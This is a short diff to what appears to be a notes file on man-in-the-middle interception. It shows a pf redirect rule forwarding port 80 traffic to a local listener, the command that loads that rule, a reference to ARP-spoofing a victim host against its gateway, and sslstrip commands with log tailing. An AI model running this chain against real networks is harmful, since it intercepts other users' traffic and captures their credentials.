@@ -27,11 +27,12 @@ on mac <a href="https://developer.apple.com/library/mac/documentation/Darwin/Ref
 
 set configuration
 
-	rdr on en0 proto { tcp, udp } from any to any port 80 -> 127.0.0.1 port 8000
+	rdr pass on inet en0 proto { tcp, udp } from any to any port 80 -> 127.0.0.1 port 8000
 
 enable it 
 
 	pfctl -v -n -f /etc/pf.conf
+	pfctl -f /etc/pf.conf
 
 on ubuntu <a href="https://help.ubuntu.com/community/IptablesHowTo">iptables</a>
 
@@ -61,4 +62,5 @@ spoof machine with ip 192.168.0.49 on mac address of 192.168.0.1 by mac address 
 ## ssl strip
 
 	sslstrip -a -l 8000 -w sslstrip.log
+	tail -f sslstrip.log
 
